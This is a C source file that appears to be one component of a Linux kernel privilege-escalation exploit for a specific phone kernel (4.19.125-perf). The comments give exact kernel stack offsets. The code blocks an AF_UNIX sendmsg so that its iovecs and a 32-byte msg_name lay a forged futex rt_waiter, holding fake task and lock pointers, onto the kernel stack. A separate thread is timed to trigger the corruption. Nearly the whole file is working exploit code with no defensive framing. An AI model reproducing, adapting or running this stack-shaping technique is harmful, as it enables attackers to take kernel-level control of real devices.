/*
 * sendmsg carrier for the R5G 4.19.125-perf port.
 *
 * The 4.19 rt_waiter is a 0x50-byte stack object in do_futex(), at
 * T-0x198 (T = syscall-entry SP).  On the R5G the pselect stack_fds
 * array starts at T-0x230, so only the result bitmaps overlap the
 * waiter and do_select()'s early break cannot shape all fields.
 *
 * A blocking AF_UNIX sendmsg has a different frame chain:
 *   __arm64_sys_sendmsg  sub sp, sp, #0x90
 *   ___sys_sendmsg       sub sp, sp, #0x190
 *   iovstack             sp + 0x38   (8 * 0x10 = 0x80)
 *   address              sp + 0xb8   (0x80)
 * which places iov[5..7] at W+0x00..W+0x2f and msg_name[0..31] at
 * W+0x30..W+0x4f.  The eight iovecs must stay at UIO_FASTIOV (8) so
 * import_iovec() uses the on-stack array.
 *
 * iov[5..7] are {NULL, 0} on purpose: they become the childless red
 * rbtree words.  task/lock/prio/deadline come from the 32-byte
 * msg_name, whose contents are copied raw (no access_ok() on them).
 */
#include "common.h"

#include <sys/socket.h>
#include <sys/time.h>
#include <fcntl.h>
#include <unistd.h>

#ifndef SENDMSG_CARRIER_TIMEOUT_MS
#define SENDMSG_CARRIER_TIMEOUT_MS 300
#endif
#ifndef SENDMSG_CARRIER_SNDBUF
#define SENDMSG_CARRIER_SNDBUF 4096
#endif

static int make_blocked_pair(int fds[2]) {
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, fds) != 0) {
    return -1;
  }

  int sndbuf = SENDMSG_CARRIER_SNDBUF;
  setsockopt(fds[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

  struct timeval tv;
  tv.tv_sec = 0;
  tv.tv_usec = SENDMSG_CARRIER_TIMEOUT_MS * 1000;
  setsockopt(fds[0], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

  int flags = fcntl(fds[0], F_GETFL, 0);
  if (flags < 0) {
    flags = 0;
  }
  fcntl(fds[0], F_SETFL, flags | O_NONBLOCK);

  static unsigned char fill[0x20000];
  memset(fill, 0x41, sizeof(fill));
  while (send(fds[0], fill, sizeof(fill), MSG_NOSIGNAL) > 0) {
  }

  fcntl(fds[0], F_SETFL, flags);
  return 0;
}

/*
 * Blocks in unix_stream_sendmsg() with the shaped 0x50 bytes on the
 * kernel stack.  The punch consumer is armed only after the socket is
 * full and immediately before sendmsg(), so the consumer cannot run
 * while the setup syscalls are still using the same kernel stack.
 */
int sendmsg_carrier_once(int seq, int *out_errno) {
  int fds[2] = {-1, -1};
  if (make_blocked_pair(fds) != 0) {
    if (out_errno) {
      *out_errno = errno;
    }
    return -1;
  }

  unsigned char name[32];
  memset(name, 0, sizeof(name));
  put64(name, 0x00,
        pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK));
  put64(name, 0x08, fake_lock);
  /* name[0x10..0x13] = prio = 0, name[0x18..0x1f] = deadline = 0 */

  static unsigned char payload[0x10000];
  memset(payload, 0x42, sizeof(payload));

  struct iovec iov[8];
  memset(iov, 0, sizeof(iov));
  iov[0].iov_base = payload;
  iov[0].iov_len = sizeof(payload);
  for (int i = 1; i <= 4; i++) {
    iov[i].iov_base = payload;
    iov[i].iov_len = 1;
  }
  /* iov[5..7] remain {NULL, 0}: tree_entry and pi_tree_entry stay zero. */

  struct msghdr mh;
  memset(&mh, 0, sizeof(mh));
  mh.msg_name = name;
  mh.msg_namelen = 32;
  mh.msg_iov = iov;
  mh.msg_iovlen = 8;
  mh.msg_control = NULL;
  mh.msg_controllen = 0;
  mh.msg_flags = 0;

  /*
   * Arm the punch at the last possible moment.  The consumer waits
   * main_route_delay_usec before sched_setattr(); 20 ms is enough for
   * this thread to enter unix_stream_sendmsg() and leave the shaped
   * frame untouched.
   */
  atomic_store(&main_route_delay_usec, 20000);
  atomic_store(&punch_consume_go, seq);

  errno = 0;
  int ret = (int)sendmsg(fds[0], &mh, MSG_NOSIGNAL);
  int saved = errno;

  atomic_store(&punch_consume_go, 0);
  close(fds[1]);
  close(fds[0]);

  if (out_errno) {
    *out_errno = saved;
  }
  return ret;
}
